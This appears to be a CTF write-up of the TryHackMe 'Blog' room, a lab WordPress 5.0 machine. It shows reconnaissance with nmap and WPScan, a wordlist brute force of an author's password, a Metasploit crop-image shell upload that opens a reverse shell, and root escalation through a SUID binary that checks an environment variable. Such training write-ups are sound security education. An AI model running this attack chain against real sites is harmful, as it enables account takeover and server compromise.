---
title: "Blog"
date: 2022-12-02
tags: ['CTF', 'tryhackme', 'WordPress', 'Writeup']
draft: false
---

{{< figure src="/blog/blog.png" height="240px" width="240px" attr="Billy Joel made a WordPress Blog!" >}}

## Intro

___

[Blog](http://tryhackme.com/room/blog), a CTF room based around exploiting a WordPress blog!

We'll start by adding the machine's ip address to our hosts file.

``` bash
echo target-ip blog.thm >> /etc/hosts
```

And then move on to some reconnaissance.

## Recon

___

### Information Gathering

First we'll run an nmap scan of the target, using nmap's "default" scripts (-sC) and version scanner (-sV).

``` bash
nmap -sC -sV -T4 blog.thm
```

``` bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-05 02:16 EST
Nmap scan report for blog.thm (10.10.1.240)
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-01-05T07:16:41+00:00
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-01-05T07:16:41
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds

```

Thanks to the version scan, we've found the answers to two questions already:

> What CMS is Billy using?  
> *WordPress*  

> What version of the above CMS was being used?  
> *5.0*

Now that we know what version of WordPress is running, we can search for known vulnerabilities.
If we search the CVE database for "WordPress 5.x" it'll be the first result!

- [CVE-2019-8942](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942)  

And the exploit-db page for the vulnerability.

- [exploit-db](https://www.exploit-db.com/exploits/46662)

We'll need an account with author access for the exploit, so next we'll use a tool called WPScan to scan the blog for possible usernames.

``` bash
wpscan --url http://blog.thm --enumerate u
```

``` bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.thm/ [10.10.1.240]
[+] Started: Thu Jan  5 02:40:45 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <======================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jan  5 02:40:51 2023
[+] Requests Done: 24
[+] Cached Requests: 38
[+] Data Sent: 6.858 KB
[+] Data Received: 143.396 KB
[+] Memory used: 163.559 MB
[+] Elapsed time: 00:00:05
```

We've found a couple of author accounts: "bjoel" and "kwheel", next we'll run the tool again in password cracking mode.

Billy's password isn't crackable with the rockyou ( or any other) wordlist, so we'll try his mom's account.

``` bash
wpscan --url blog.thm -U kwheel -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 64 

```

About a minute and a half later, we should have Kelly's password.

## User.txt

___

### Exploitation

The [exploit](https://www.exploit-db.com/exploits/46662) we found earlier is actually a Metasploit module so we'll open the Metasploit console with:

``` bash
msfconsole -q
```

The module is called "Crop-image Shell Upload", we can find it by searching for "crop-image"

``` bash
search crop-image
use 0
```

Before we can use the exploit, we have to set the USERNAME, PASSWORD, RHOST, and LHOST options. Once those are set, we can run the module.

``` bash
set USERNAME kwheel
set PASSWORD *********
set RHOST blog.thm
set LHOST your-ip

exploit
```

When the epxloit has finished, we can start our shell with:


``` bash
shell
script -qc /bin/bash /dev/null
```

Now that we've started our shell we can search for the user flag.

``` bash
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt

cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

Hmmm, that didn't work. Let's try escalating to root to find the real user flag.

## Root.txt

___

### Privilege Escalation

We'll start off searching for applications with an suid set.

``` bash
find / -type f -perm -04000 2>/dev/null

/usr/sbin/checker
```

We find a bit of an odd one in "/usr/sbin/checker", let's run it and see what happens.

``` bash
checker

Not an Admin
```

Not much info there; we'll run it through a program called "ltrace", which runs the command until right before completion, tracing its library calls.


``` bash
ltrace /usr/sbin/checker

getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin)                 = 13
+++ exited (status 0) +++

```

It seems checker checks an environment variable (admin) and if it doesn't exist (returns nil) prints "Not an Admin"

We'll try to set the admin variable to something before running the command again.

``` bash
export admin="kcalb"
checker
```

(You can set admin to anything, the program only checks that it exists.)

``` bash
whoami
root
```
Success! Now that we have root access we'll run another search for the user flag.

``` bash
find / -name user.txt 2>/dev/null
/media/usb/user.txt

cat /media/usb/user.txt
```
That also answers the last question.

> Where was user.txt found?  
> */media/usb*

Lastly, we'll search for and print out the root flag.

``` bash
find / -name root.txt 2>/dev/null
/root/root.txt

cat /root/root.txt
```

## Success!

___

That's it! We've captured both Blog flags!
